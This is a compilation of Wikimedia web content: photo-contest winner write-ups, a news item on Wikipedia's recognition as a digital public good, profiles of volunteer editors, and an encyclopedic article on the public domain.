Serbia’s Monument to the Unknown Hero commemorates all the unidentified soldiers that perished in Serbian service during the First World War. The contest judges loved User:Ivanbuki’s photo of the site, with one saying that they chose an ideal day: “the cover of the snow and the fog makes the scene more dramatic, making the analogy of the harsh climate with the roughness of life in wartime.”




NINTH PLACE

Photo by Hadi Dehghanpour, CC BY 4.0

This photo of a ribat in Seyyedabad, Chenaran, Iran, used a top-down perspective to create an unusual perspective of this centuries-old structure. One of the contest judges thought that it was “one of the most original in the contest.” Photographer Hadi Dehghanpour, a long-time participant in Wiki Loves Monuments, found this view while traveling with an archaeologist friend. “The area was deserted and the weather was sunny and warm,” they recalled.




TENTH PLACE

Photo by Domenico Ianaro, CC BY-SA 4.0

Domenico Ianaro used the hilltop location of Italy’s Basilica of Superga to frame the building against the hulking Monte Rosa massif behind it. Although the basilica is the subject of many photographs, the contest judges loved the unusual soft glow brought on by the setting sun, which made for a contrast between the warm building and cold mountain range.




ELEVENTH PLACE

Photo by Filipe Salgado, CC BY-SA 4.0

Much like Filipe Salgado’s other contest-winning photo at #5, this photo of Livraria Lello—known as the bookshop from the Harry Potter film series—finds a famed and often crowded location devoid of people. The judges were impressed by Salgado’s capture of an often photographed monument in an unusual way with their framing of Livraria Lello’s famous staircase alongside the shop’s books.




TWELFTH PLACE

Photo by Gilad Topaz, CC BY-SA 4.0

This photo of the fishing village of Henningsvær in the Lofoten archipelago was the second of three photos from Gilad Topaz’s winter trip to Norway to make this list (#7 and #17). The contest judges hailed this photo for its contrasts between humanity and the natural landscape. One thought that the perspective provided a reminder of “how communities living in tough and remote places establish and organize themselves”, while another remarked that it was “a unique picture that few people can take.”




THIRTEENTH PLACE

Photo by Vaido Otsar, CC BY-SA 4.0

This exquisite example of ruins photography comes from a former Kreenholm Manufacturing Company building in Estonia. According to Wikipedia, the company held what were at one point the largest cotton spinning and manufacturing mills in the world. As of 2021, however, only 31 people were working at the site. Photographer Vaido Otsar was on a tour of the building when he happily discovered what they called the “rhythm” of the pillars of this section.




FOURTEENTH PLACE

Photo by Matteo Pappadopoli, CC BY-SA 4.0

Matteo Pappadopoli traveled over 900 km from home for the Carnival of Venice. The carnival is famed for its attendees’ intricate costumes and masks, and so Pappadopoli brought their camera to snapshot to snapshot the best of them. Pappadopoli’s plans changed when they realized that a change in the weather could present an opportunity (translated from the Italian):

> “I saw fog descending at the same time the sun was setting. Sensing the atmosphere that was being created, favorable for photography, I positioned myself for the photo, looking for the best composition and waiting for the most favorable moment.”

One of the contest judges remarked that the photo found “an almost poetic perspective that transmits the beauty of the space and the melancholy at the same time.”




FIFTEENTH PLACE

Photo by User:Arseniog, CC BY-SA 4.0

The definition of a photo that tells a story, User:Arseniog’s timelapse in this photo of Santia Castle in Zaragoza, Spain, vividly illustrates the passage of time. “This image not only represents the medieval castle of Santia,” one contest judge said, “but also the essential idea about the meaning of monuments as those creations of culture that stubbornly persist over time and survive the harshness of the elements.”




SIXTEENTH PLACE

Photo by Emman A. Foronda, CC BY-SA 4.0

At a brief glance, you might think that this is an unusual example of a metaphysical painting from Giorgio de Chirico. In fact, it is a photo of Christ the King Parish in Quezon City, the Philippines. The building is “often admired for its architecture and the serene atmosphere it provides,” according to photographer Emman A. Foronda, and “the way it stands out while still being part of the local community speaks to its significance in the area.”




SEVENTEENTH PLACE

Photo by Gilad Topaz, CC BY-SA 4.0

The final of three award-winning photos submitted by Gilad Topaz (#7, #12), this shot of a wharf and seaside buildings in Henningsvær, Norway, showcases the village’s traditional fishing architecture. “It is a very original perspective of these buildings,” one contest judge wrote. They added that it was not just the reflection in the water that contributed to their assessment, but the “deformed lines and color management that make it even look like a painting.”




EIGHTEENTH PLACE

Photo by Mohamed Ali Yahmed, CC BY-SA 4.0

This fortified structure located in the western Libyan city of Nalut is about a thousand years old. It was originally intended to store harvested grains in war-stricken times. Photographer Mohamed Ali Yahmed knew of the archaeologically significant ruins because they live nearby, and their work was commended by the contest judges for its human-leveled perspective and the composition’s inclusion of various building materials.




NINETEENTH PLACE

Photo by Agon Nimani, CC BY-SA 4.0

Agon Nimani’s airborne photo of the National Library of Kosovo was a spur of the moment decision; they were driving by the building and recognized that the weather would lend itself to a spectacular shot. The contest judges agreed. One noted that it could be a demonstration piece on the continuing importance of black and white photography, while another said:

> “The photographer […] understood profoundly the essence of the design of the library by reducing the image of the building to its fundamental features. The photograph here is transformed into a carbon sketch of the library, like the architects may have sketched it with a pencil on a white piece of paper when having a moment of inspiration before the library was even constructed.”




TWENTIETH PLACE

Photo by User:Alhotmane, CC BY-SA 4.0

The oasis settlement of Ghadames has been around for thousands of years, and its old town was listed as a UNESCO World Heritage Site in 1986. This aerial photo of the old town was praised by the judges as it “showed the beautifully imperfect squares of each house and how the whole group comes together to form this beautiful organic pattern,” in the words of one judge.




TWENTY-FIRST PLACE

Photo by Aneza Paliou, CC BY-SA 4.0

Aneza Paliou prefers to photograph her subjects around dawn, and the early morning light provided the perfect soft lighting for this shot of medieval buildings lining a street in Rhodes, Greece. Aneza was motivated to submit photos of Rhodes to expand knowledge about the island she lives on, which in her words is a rare example of a “medieval residential complex that has survived almost intact with its fortifications, urban planning, public buildings, temples and houses.”




TWENTY-SECOND PLACE

Photo by User:Athichitra/@artie__garden__, CC BY-SA .0

Each element within this photo from User:Athichitra was an intentional choice. The Great Buddha of Thailand is framed here by rice fields and the sky, “just like a symbol of Thailand’s spiritual land,” they said. They added:

> “I had traveled several hours from home to reach Muang temple and arrived at just the right time when the light was soft. I set up my shot low in the rice field to frame the statue rising behind the traditional wooden hut to highlight the connection to the land. What made the moment magical was the flock of birds flying across the sky, adding movement and life. Together, these elements created a balanced, serene scene that felt both powerful and peaceful.”




TWENTY-THIRD PLACE

Photo by User:Hamed.gisoo, CC BY-SA 4.0

The Jameh Mosque in Varamin, Iran, was completed in 1322. User:Hamed.gisoo’s photograph of its central courtyard won praise from one judge for the variety of stories it told, the composition that created depth, the lighting that illuminated the brickwork, and the birds that added life.




TWENTY-FOURTH PLACE

Photo by Basavaraj M, CC BY-SA 4.0

“Capturing monuments is my passion,” says Basavaraj M, the photographer behind this shot of Vitthala Temple within the UNESCO World Heritage Site of Hampi, India. Basavaraj was part of a group of photographers that visited the site during monsoon season, which provided the water visible throughout the image. They knew immediately that it was one of the best photos they had ever taken.




TWENTY-FIFTH PLACE

Photo by Oussama Hamama, CC BY-SA 4.0

On a boiling afternoon in mid-July, photographer Oussama Hamama was moving around the Hassan Towner in Rabat, Morocco, looking for that perfect shot. They found it with a couple of tourists walking towards the incomplete mosque. “The presence of the couple served as a means to ‘humanise’ the picture and to put emphasis on the majestic aspect of the monument,” Oussama said. Even though they had to hurry to get the photo before the couple moved too far, the symmetry and balance in the photo led to its twenty-fifth place finish in this year’s Wiki Loves Monuments.

WIKIPEDIA RECOGNIZED AS A DIGITAL PUBLIC GOOD

By Wikimedia Foundation•12 February 2025

Facebook Twitter Bluesky LinkedIn Email Copy Link Link copied

The UN-endorsed Digital Public Goods Alliance has added Wikipedia to its registry, affirming the important role its volunteer editors play in making the internet better for everyone.

Feb 12, 2025  ― Wikipedia has officially been recognized as a digital public good (DPG) by the Digital Public Goods Alliance (DPGA), a multistakeholder initiative that maintains a Registry of Digital Public Goods: open source-software, data, AI models, standards, and content created for the public interest.  The DPGA is endorsed by the United Nations (UN) Secretary-General in support of open source technologies that contribute to the advancement of the Sustainable Development Goals (SDGs). This recognition of Wikipedia, the free online encyclopedia hosted by the nonprofit organization the Wikimedia Foundation, highlights its unique role in advancing global access to a free and open source of trusted knowledge in the public interest. 

According to Liv Marte Nordhaug, CEO of the DPGA Secretariat: 



> “Wikipedia’s recognition as a digital public good is a testament to the power and importance of open access to knowledge. Wikipedia stands as a prime example of how technologies can drive equitable and unrestricted access to information, accelerating the attainment of the Sustainable Development Goals worldwide.” 



Wikipedia, the world’s largest online encyclopedia and only top-visited website operated by a non-profit organization, contains reliably sourced information that is shared, maintained, and verified by a global community of nearly 260,000 volunteers in over 300 languages. 



> “The Wikimedia Foundation works with affiliate organizations and volunteer Wikipedians across the world to advocate for policies that protect and support Wikipedia and other digital public goods upon which the free knowledge ecosystem depends,” said Rebecca MacKinnon, Vice President of Global Advocacy at the Wikimedia Foundation. “We look forward to working with the Digital Public Goods Alliance, along with other organizations and communities that create and maintain digital public goods, to build a better internet that serves the public interest.”



In 2024 Wikimedia Foundation staff along with Wikipedia volunteers from around the world participated in the UN General Assembly’s Summit for the Future and the drafting of the Global Digital Compact—the UN’s blueprint for global governance of digital technology and artificial intelligence. 

In an open letter in early 2024, the Wikimedia Foundation and Wikimedia affiliates called on UN Member States to:

 * Protect and empower communities to govern online public interest projects.
 * Promote and protect digital public goods by supporting a robust digital commons from which everyone, everywhere, can benefit.
 * Build and deploy Artificial Intelligence (AI) and machine learning (ML) to support and empower, not replace, people who create content and make decisions in the public interest.

The recognition of Wikipedia as a digital public good strengthens these advocacy efforts and affirms Wikipedia’s role in the broader global movement for an internet that protects and promotes community-led spaces. The Wikimedia Foundation will continue working with the UN and other international institutions, governments, and civil society partners to ensure that digital public goods like Wikipedia are protected, supported, and accessible to all.

PRANAYRAJ VANGARI

Editor since 2013, Wikimedia community

CC BY-SA 4.0, Pranayraj Vangari
Wikimedia Blog
User:Pranayraj1985

On 7 September 2017, Pranayraj Vangari created an article about Telangana culture on the Telugu Wikipedia. In response, members of the Telugu Wikipedia community gathered to celebrate.

Why? This marked the end of Vangari’s self-given challenge to create one Wikipedia article per day for 365 consecutive days. He even wrote an article on the day he got married. He called this his “wikiyear,” as it had grown out of the #100wikidays challenge.

His dedication inspired his wife to create a Wikipedia account. “Our fellow Wikipedian Pavan Santhosh coined a term for that: Wiki Kalyanam (Wiki Marriage),” Vangari noted.

Vangari is a native of Telangana’s capital Hyderabad. He works as an assistant theater director and is working on an M.Phil degree in theater arts.

Since joining Wikipedia as an editor in March 2013, Vangari has made over 85,000 edits on the Telugu Wikipedia and created over 700 new articles—a not insignificant chunk of the Telugu Wikipedia’s 67,000 total articles. The site, which has been growing since 2003, now ranks as the fifth-largest Indian language on Wikipedia.

#100wikidays challenge extends to a year

Vangari heard about #100wikidays from fellow Wikipedians who had completed the challenge. During #100wikidays, editors write a new Wikipedia article every day for 100 consecutive days. Vangari decided to take his challenge even further.

“At first, I thought that 100wikidays [were] enough,” Vangari recalls, “but … on the 95th day of this challenge, I decided to take up the wikiyear challenge.”

Over the course of a full a year, Vangari encountered several occasions when it was difficult to find time to create and edit a page. He had to travel for work, or even get married. That was no barrier for Vangari. He was always prepared.

“When I go away, I carry my laptop and [a list of] previously-selected articles to work on,” he explains. In September 2016, he was an assistant director for a Telugu film. Vangari had to be on location at 7 a.m. and wouldn’t return home until 11 p.m. “I woke up at 5 a.m. every morning, selected the article content, created the article at 5:30 with some content, then completed it when I came back home in the evening,” Vangari recalls.

Vangari is so dedicated to Wikipedia that the community nominated him as an administrator. When not online, he can be found at local editing workshops where he helps new users learn how to create and edit articles.

“Wikipedia is the first door I knock on for knowledge,” Vangari says. “The idea of giving your part and contributing to Wikipedia sounds like a fantastic idea to me. Making my knowledge available to the rest of the world for free is what inspires me to keep editing … Wikipedia is important because it helps share the knowledge irrespective of who you are.”

And that inspiration has never gone away. In June 2019, Vangari nearly tripled his original year-long challenge: one thousand new Wikipedia articles in one thousand days.

CHRISTINE MEYER

Editor since 2007, Wikimedia community

Wikimedia Blog
User:Figureskatingfan

Have you ever visited a Wikipedia page and found it so deeply engaging that you read through every word, then found yourself going deeper and deeper into the original source material? Take the history of Sesame Street, for example. The article describes how the early children’s program has changed and adapted over the past five decades, and contains wonderfully vivid details about the show’s earliest days.

Much of this is thanks to Christine Meyer, better known on Wikipedia as FigureSkatingFan. Meyer has worked on many of the articles related to Sesame Street, including the flagship article as well as pieces related to international co-productions and how Sesame Street conducts research.

Meyer has been editing Wikipedia for a decade. In that time, she’s made over 27,000 edits on the site and contributed to 23 featured articles and lists, as well as two featured topics—where “featured” is an indicator of high quality. Her interests span from children’s programming to American poet, memoirist, and civil rights activist Maya Angelou to the GA Cup, an annual contest focusing solely on good articles (another quality ranking).

From proofreader to editor

Meyer’s first edit on Wikipedia was made on 3 February 2007. “I saw the tagline on the main page—the free encyclopedia that anyone can edit—and actually believed it,” she says. “So I clicked on the link and set up an account, because I usually do what I’m told.”

At the start, Meyer focused on her attention on correcting typos. She graduated to checking sources, then moved into the trenches of editing–research, writing, and collaborating with others.  “I found that I really enjoyed the collaborative nature of Wikipedia, most of the time, when it wasn’t contentious,” Meyer says.

All roads lead to Sesame Street

Like many Wikipedia editors, Meyer started with what she knew. She’s a long-time fan of The Muppets, and first began watching the show since it premiered in 1969. “Plus, my kids are severely developmentally disabled, so we watched it daily,” Meyer says. “That makes me a natural expert on children’s television, so that became a niche for me on Wikipedia.”

> My other articles are about The Wiggles, which I know everything about, Blue’s Clues (another featured article), and Sesame Street.  Sesame Street has the most written about it, so it was easy to research.  As I worked on the Sesame Street article, I found that I had enough content for the History of Sesame Street article, so I created and developed it.  I’ve developed a good-sized library about children’s TV.  It was fun and inspirational learning about Sesame Street! One of my favorite SS articles is Sesame Street international co-productions because it describes some of the great outreach Sesame Workshop does.

The Wiggles was her first featured article, which she took on because the show had made a big impact on her kids’ life.  Then she moved onto Blue’s Clues — “which is still my son’s favorite thing in the universe” — and found a lot of research about it. One of her sources was Malcolm Gladwell’s book The Tipping Point, which has a couple of chapters about Blue’s Clues and Sesame Street. That brought her to Sesame Street. “I always say, ‘All roads lead to Sesame Street.‘ That’s kind of how articles happen for me: I follow a bunny trail, and if something interests me, I stop.”

Documenting a prolific writer and remarkable figure

Meyer had always admired Maya Angelou, especially after reading her first autobiography I Know Why the Caged Bird Sings in high school. ” I stumbled upon the Caged Bird article, and was shocked at its low quality,” Meyer says. “Then I visited her biography article and became appalled that such an important writer and figure would have articles about her in such poor shape.” This was also around the time Meyer learned about Wikipedia’s gender gap. “Like other women editors have done, I decided to help change it, and that’s when I became a committed editor.”

Meyers wrote the Caged Bird article with research and writing help from Moni3, Scartol (an English high school teacher), and the late Adrianne Wadewitz. She read everything she could about Angelou’s writing. She read all six of Angelou’s autobiographies, then wrote articles about each of them and brought them all to featured article status.

“It became a personal goal to create a featured topic about her, which I’m very proud of accomplishing in mid-May 2014,” Meyer says. Less than two weeks later, Angelou died at the age of 86. Her bio and Caged Bird articles were read by about 1 million people the week she passed.

“The world turns to Wikipedia when people die, and I’m proud that I was partly responsible for ensuring that people have high-quality, well-written, well-researched information about her,” says Meyer. “My only regret is that I never got to meet her.”

Advice for new editors

“Committed editors need to learn Wiki-markup; there’s no way to avoid it,” Meyer says. She admits she’s not the most technical person in the world, but stuck with it until she figured it out.

“I use VisualEditor, which is a good tool, but it has limitations. I like the citing templates, since creating citations by hand can be cumbersome.”

Above all, she says the best tool in Wikipedia is other editors. Meyer says most are enthusiastically willing to help if you ask. “Collaboration is often the best part about Wikipedia, as I said above, so you can always find folks to help you,” she says.

Learning through research, writing, and collaboration

Her favorite part about contributing to Wikipedia is that she gets to learn something new by researching articles and writing them.

> One of the most fun things is to find an article you think would never have the potential to be a featured article, and then after researching it, you discover that they do.  One of those articles for me was Stanford Memorial Church.  Now, I didn’t attend Stanford (although my sister-in-law did as an undergraduate), but it just drew me in.  Its development is another wonderful example of collaboration. Plus, I got to learn about art, architecture, and organs. One of the highlights of my recent life is visiting the church in the summer of 2014, which was a spiritual experience.

Meyer says one of her favorite aspects of editing can also be contentious for some contributors: the collaborative nature of editing. “When it works, it’s great, but when it’s contentious or controversial, it can be painful. I’ve been lucky; despite always being out as a woman, I’ve had very few experiences with overt sexism.  I’ve seen others experience it, though, so I know it happens. I tend to be drawn towards non-controversial topics, so I haven’t attracted much attention from the trolls.”

Meyer is particularly proud of her contributions to the Wikipedia GA Cup: a championship-style editing challenge focusing solely on Good Articles. The purpose of this competition is to encourage high-quality reviews and promotions of Good Articles, and to help decrease the traditionally long queue of good article nominations. “I estimate that because of the GA Cup, I’ve helped improve hundreds of articles, which is more effective than the few articles I’ve contributed to,” she says. “Both [are] important, but I’m proud of the difference we’ve made.”

VITOR MAZUCO

Editor since 2009, Wikimedia community

Wikimedia Blog
User:Vitor Mazuco

Vitor Mazuco‘s contributions to the Portuguese Wikipedia are impressive: to date, he has made over 280,000 edits and created more than 2,400 articles. Fellow editors have noted 34 of them for their quality—many of which are about the Canadian singer and songwriter Avril Lavigne.

Mazuco made his first edit to Lavigne’s Wikipedia article at the age of 14. He dedicated quite a bit of time in the following years to improving Wikipedia’s content about her.

“I remember that in my first months of [contributing], I wanted to expand and improve all Avril Lavigne articles,” says Mazuco. He faced many challenges, though, because he didn’t yet understand—or care to follow—Wikipedia’s sourcing policy. “I did not want to read [sources about her], and I was only 14 … imagine the size of my immaturity.” Mazuco was even banned from Wikimedia Commons for two years because he failed to follow its policies.

Mazuco eventually learned how to properly source articles and became one of the most active Portuguese Wikipedia editors. Along with his detailed upkeep of Lavigne-related articles, Mazuco contributes to other music articles, works to combat vandalism on the site, and leads several offline initiatives as part of the Wikipedia Education Program and the Wikimedia Brazil User Group.

“I show how the teacher can help [their] students with … Wikipedia inside the classrooms, and break the prejudice that our country has about [Wikipedia’s] reliability,” Mazuco explains. “It’s a job I’m very proud of.”

Mazuco believes that working with students will be the center of his attention for the next few years. He believes in everyone’s right to access “free and quality knowledge, regardless of their race, religion, status, or anything.” He explains:

> “[Wikipedia] is a place, where I learn many things, every day. I meet new people in the meetings, at the conferences, I improve my skills, spelling, knowledge, about [any] subject. I am very curious person. I always want to know about something.”

Only a tiny fraction of the world’s knowledge systems are captured in books or other forms of visual and oral material, and the internet – for all its democratic, emancipatory potential – further skews what we use as knowledge every day.

Google estimated in 2010 that there are about 130 million books in at least about 480 languages. Of these, only about 20% are freely accessible in the public domain and 10-15% are in print. In a world of 7 billion people speaking nearly 7000 languages and dialects, we estimate that only about 7% of those languages are captured in published material; a smaller fraction of the world’s knowledge is converted into digital knowledge; and a still smaller fraction of that is available on the internet.

We’re piloting resources and methods for centering the knowledge and expertise of marginalized communities on the internet, starting with Wikipedia’s online knowledge repository. As one of the world’s most visited websites, Wikipedia is a good proxy for knowledge on the internet more broadly, and we know that Wikipedia is not representative of the knowledge of the world.

Using Wikipedia as a proxy indicator of freely available online knowledge, we know that only 20% of the world (primarily white male editors from North America and Europe) edits 80% of Wikipedia currently, and estimate that 1 in 10 of the editors is self-identified female. Studies by Mark Graham and colleagues at the Oxford Internet Institute have found that 84% of Wikipedia articles focus on Europe and North America, and most articles written about the global South are still written by those in the global North, so that even where content is present, skewed representations remain.

Communities, like the Dalits from India and the US, queer feminists from Bosnia and Herzegovina, and Kumeyaay Native Americans, have led the way in mapping their own knowledge to find critical gaps in Wikipedia, and then creating and improving related content to fill those gaps. We support and amplify these efforts and look for new opportunities to build alliances and create space for other communities online as well.

QUESTIONS WE CARE ABOUT:

 * Who participates in the production of knowledge?
 * How can we diversify our sources?
 * Is ‘neutrality’ a virtue?

 * Issues
   * Exploring our Origins
   * Public Online Knowledge
   * Digital Infrastructure
   * Privacy, Surveillance and Security

   What do sheep leaping into a river, a master locksmith, and a traditional milking technique have in common? They are all iconic moments from Turkish folklore captured in photos during Türkiye’s first Wiki Loves Folklore competition. Wiki Loves Folklore is a global photography contest celebrating folk traditions and cultural heritage. In 2025, it was held in Türkiye for the first time. The photos uploaded from the country inspired User:Basak, from Wikimedia Community User Group Turkey, to further contribute to Wikimedia projects and preserve local heritage online. These contributions – showing familiar people, traditions, and places – make knowledge feel more meaningful and relatable, and all the more important to preserve. Stories like these show how free knowledge often begins with curiosity and how a single photo can spark countless connections.

   High in the Peruvian Andes, the ancient Incan city of Machu Picchu remains one of the world’s greatest archaeological wonders. Built in the 15th century, it now stands as a UNESCO World Heritage Site and a symbol of Incan ingenuity. 📸 Every day, the Wikimedia Commons community votes to spotlight a Picture of the Day from Wikimedia Commons' collection of over 115,000,000 freely usable media files. This photo by Diego Delso is today's selection – capturing the breathtaking terraces, stone structures, and surrounding peaks of the historic site. A testament to both history and the power of free knowledge. View more community-selected pictures ➡️ https://w.wiki/7dzN

   In an era where digital accessibility is reshaping how we interact with culture, Spain’s MuseoReina Sofía appointed a Wikipedian in Residence to bridge traditional institutions and open knowledge. From 2022 to 2024, Carolina Espinoza led this initiative, embedding Wikipedia into museum activities, training staff, and engaging the public in collaborative knowledge-sharing. Her work empowered communities to participate in cultural preservation, integrated Wikipedia into exhibitions and public programs, and helped expand the museum’s reach, ensuring that underrepresented narratives and diverse perspectives found a space in the world’s largest free knowledge platform. As Carolina put it, “cultural activities without dissemination do not exist”. This initiative proves that when institutions embrace open access, they transform from gatekeepers of history into facilitators of global knowledge.

   For over a decade, senior citizens in the Czech Republic have been learning to edit Wikipedia through the Seniors Write Wikipedia course – an initiative led by Wikimedia Czech Republic that has been a transformative journey into the world of collaborative knowledge sharing. This initiative has empowered more than 700 seniors across numerous cities – including Cheb, Plzeň, Ústí nad Labem, and Brno – to become active contributors to Wikipedia. Its success lies in its comprehensive approach: offering both beginner and advanced courses, training librarians to lead sessions, and fostering community through regular Wikipedia clubs. Innovations have further enriched participants' engagement, enabling them to document local heritage and delve into specialized topics focused on Wikimedia Commons to teach participants how to contribute to and utilize this valuable resource. Seniors Write Wikipedia enhances digital literacy among seniors and underscores the invaluable contributions they can make to preserving and disseminating knowledge.The program exemplifies the power of lifelong learning and the boundless potential of intergenerational knowledge exchange.

   In Mexico, mangroves play a crucial ecological role, preserving biodiversity and protecting coastal communities from hurricanes. However, human activities have led to significant deforestation. To combat this, local environmental groups like Las Guardianas del Conchalito, a collective of 12 dedicated women in La Paz are leveraging technology for conservation. Collaborating with organizations such as Wikimedia México and the Humanitarian OpenStreetMap Team (HotOSM), they have integrated open-source tools and low-cost drones into their efforts. These drones capture high-resolution aerial images, enabling the creation of accurate maps through platforms like Drone Tasking Manager and OpenAerialMap. This approach reduces reliance on expensive, proprietary satellite data, empowering communities to independently monitor and protect their environment. Workshops led by professionals have equipped local collectives to utilize these technologies effectively. By combining traditional conservation methods with innovative technology, these community-driven initiatives exemplify the power of open knowledge and collaboration in environmental stewardship.

SUMMARY

[edit]

DescriptionCommons-logo.svg
English: The Wikimedia Commons logo, SVG version.
Date 10 September 2005 Source
 * Original created by Reidab (PNG version)
 * SVG version was created by Grunt and cleaned up by 3247.
 * Re-creation with SVG geometry features by Pumbaa, using a proper partial circle and SVG geometry features. (Former versions used to be slightly warped.)

Author Reidab, Grunt, 3247, Pumbaa Permission
(Reusing this file) Message from the original creator, Reidab: "I'd be happy for the copyright to be transfered to the Wikimedia Foundation. I'll clean it up a bit and then sent it off to you. I think that illustrator can export to an svg, but if it can't, I'll send is as an eps." Other versions

The public domain (PD) consists of all the creative work to which no exclusive intellectual property rights apply. Those rights may have expired,[1] been forfeited,[2] expressly waived, or may be inapplicable.[3] Because no one holds the exclusive rights, anyone can legally use or reference those works without permission.[3][4]

As examples, the works of William Shakespeare, Ludwig van Beethoven, Miguel de Cervantes, Zoroaster, Lao Zi, Confucius, Aristotle, L. Frank Baum, Leonardo da Vinci and Georges Méliès are in the public domain either by virtue of their having been created before copyright existed, or by their copyright term having expired.[1] Some works are not covered by a country's copyright laws, and are therefore in the public domain; for example, in the United States, items excluded from copyright include the formulae of Newtonian physics and cooking recipes.[5] Other works are actively dedicated by their authors to the public domain (see waiver); examples include reference implementations of cryptographic algorithms.[6] The term public domain is not normally applied to situations where the creator of a work retains residual rights, in which case use of the work is referred to as "under license" or "with permission".

As rights vary by country and jurisdiction, a work may be subject to rights in one country and be in the public domain in another. Some rights depend on registrations on a country-by-country basis, and the absence of registration in a particular country, if required, gives rise to public-domain status for a work in that country. The term public domain may also be interchangeably used with other imprecise or undefined terms such as the public sphere or commons, including concepts such as the "commons of the mind", the "intellectual commons", and the "information commons".[7]


HISTORY

Although the term domain did not come into use until the mid-18th century, the concept can be traced back to the ancient Roman law, "as a preset system included in the property right system".[8][page needed] The Romans had a large proprietary rights system where they defined "many things that cannot be privately owned"[8][page needed] as res nullius, res communes, res publicae and res universitatis.[9] The term res nullius was defined as things not yet appropriated.[10] The term res communes was defined as "things that could be commonly enjoyed by mankind, such as air, sunlight and ocean."[8][page needed] The term res publicae referred to things that were shared by all citizens, and the term res universitatis meant things that were owned by the municipalities of Rome.[8][page needed] When looking at it from a historical perspective, one could say the construction of the idea of "public domain" sprouted from the concepts of res communes, res publicae, and res universitatis in early Roman law.[8][page needed]

When the first early copyright law was originally established in Britain with the Statute of Anne in 1710, public domain did not appear. However, similar concepts were developed by British and French jurists in the 18th century. Instead of "public domain", they used terms such as publici juris or propriété publique to describe works that were not covered by copyright law.[11]

The phrase "fall in the public domain" can be traced to mid-19th-century France to describe the end of copyright term. The French poet Alfred de Vigny equated the expiration of copyright with a work falling "into the sink hole of public domain"[12] and if the public domain receives any attention from intellectual property lawyers it is still treated as little more than that which is left when intellectual property rights, such as copyright, patents, and trademarks, expire or are abandoned.[7] In this historical context Paul Torremans describes copyright as a, "little coral reef of private right jutting up from the ocean of the public domain."[13] Copyright law differs by country, and the American legal scholar Pamela Samuelson has described the public domain as being "different sizes at different times in different countries".[14]


DEFINITION

Newton's own copy of his Principia, with hand-written corrections for the second edition

Definitions of the boundaries of the public domain in relation to copyright, or intellectual property more generally, regard the public domain as a negative space; that is, it consists of works that are no longer in copyright term or were never protected by copyright law.[15] According to James Boyle this definition underlines common usage of the term public domain and equates the public domain to public property and works in copyright to private property. However, the usage of the term public domain can be more granular, including for example uses of works in copyright permitted by copyright exceptions. Such a definition regards work in copyright as private property subject to fair use rights and limitation on ownership.[1] A conceptual definition comes from Lange, who focused on what the public domain should be: "it should be a place of sanctuary for individual creative expression, a sanctuary conferring affirmative protection against the forces of private appropriation that threatened such expression".[15] Patterson and Lindberg described the public domain not as a "territory", but rather as a concept: "[T]here are certain materials – the air we breathe, sunlight, rain, space, life, creations, thoughts, feelings, ideas, words, numbers – not subject to private ownership. The materials that compose our cultural heritage must be free for all living to use no less than matter necessary for biological survival."[16] The term public domain may also be interchangeably used with other imprecise or undefined terms such as the public sphere or commons, including concepts such as the "commons of the mind", the "intellectual commons", and the "information commons".[7]


PUBLIC DOMAIN BY MEDIUM


BOOKS

A public-domain book is a book with no copyright, a book that was created without a license, or a book where its copyrights expired[17] or have been forfeited.[clarification needed][18]

In most countries the term of protection of copyright expires on the first day of January, 70 years after the death of the latest living author. The longest copyright term is in Mexico, which has life plus 100 years for all deaths since July 1928.[19]

A notable exception is the United States, where every book and tale published before 1930 is in the public domain; US copyrights last for 95 years for books originally published between 1930 and 1978 if the copyright was properly registered and maintained.[20]

For example: the works of Jane Austen, Lewis Carroll, Machado de Assis, Olavo Bilac and Edgar Allan Poe are in the public domain worldwide as they all died over 100 years ago.[21]

Project Gutenberg, the Internet Archive and Wikisource make tens of thousands of public domain books available online as ebooks.[22][23][24]


MUSIC

People have been creating music for millennia. The first musical notation system, the Music of Mesopotamia system, was created 4,000 years ago. Guido of Arezzo introduced Latin musical notation in the 10th century.[25] This laid the foundation for the preservation of global music in the public domain, a distinction formalized alongside copyright systems in the 17th century. Musicians copyrighted their publications of musical notation as literary writings, but performing copyrighted pieces and creating derivative works were not restricted by early copyright laws. Copying was widespread, in compliance with the law, but expansions of those laws intended to benefit literary works and responding to commercial music recording technology's reproducibility have led to stricter rules. Relatively recently, a normative view that copying in music is not desirable and lazy has become popular among professional musicians.[original research?]

US copyright laws distinguish between musical compositions and sound recordings, the former of which refers to melody, notation or lyrics created by a composer or lyricist, including sheet music, and the latter referring to a recording performed by an artist, including a CD, LP, or digital sound file.[26] Musical compositions fall under the same general rules as other works, and anything published before 1925 is considered public domain. Sound recordings, on the other hand, are subject to different rules and are not eligible for public domain status until 2021–2067, depending on the date and location of publishing, unless explicitly released beforehand.[20]

The Musopen project records music in the public domain for the purposes of making the music available to the general public in a high-quality audio format. Online musical archives preserve collections of classical music recorded by Musopen and offer them for download/distribution as a public service.


FILMS

Main article: Public domain film
The 1968 horror film Night of the Living Dead is public domain in the United States because its theatrical distributor failed to place a copyright indication on the prints, as would have been required to obtain a copyright at that time.

A public-domain film is a film that was never under copyright, was released to public domain by its author, or whose copyright has expired. All films released in the United States before 1 January 1930 have been entered in the public domain in that country.


VALUE

Pamela Samuelson has identified eight "values" that can arise from information and works in the public domain.[27]

Possible values include:

 1. Building blocks for the creation of new knowledge, examples include data, facts, ideas, theories, and scientific principle.
 2. Access to cultural heritage through information resources such as ancient Greek texts and Mozart's symphonies.
 3. Promoting education, through the spread of information, ideas, and scientific principles.
 4. Enabling follow-on innovation, through for example expired patents and copyright.
 5. Enabling low cost access to information without the need to locate the owner or negotiate rights clearance and pay royalties, through for example expired copyrighted works or patents, and non-original data compilation.[28]
 6. Promoting public health and safety, through information and scientific principles.
 7. Promoting the democratic process and values, through news, laws, regulation, and judicial opinion.
 8. Enabling competitive imitation, through for example expired patents and copyright, or publicly disclosed technologies that do not qualify for patent protection.[27]: 22 


RELATIONSHIP WITH DERIVATIVE WORKS

Main article: Derivative work

Derivative works include translations, musical arrangements, and dramatizations of a work, as well as other forms of transformation or adaptation.[29] Copyrighted works may not be used for derivative works without permission from the copyright owner,[30] while public domain works can be freely used for derivative works without permission.[31][32] Artworks that are public domain may also be reproduced photographically or artistically or used as the basis of new, interpretive works.[33] Works derived from public domain works can be copyrighted.[34]

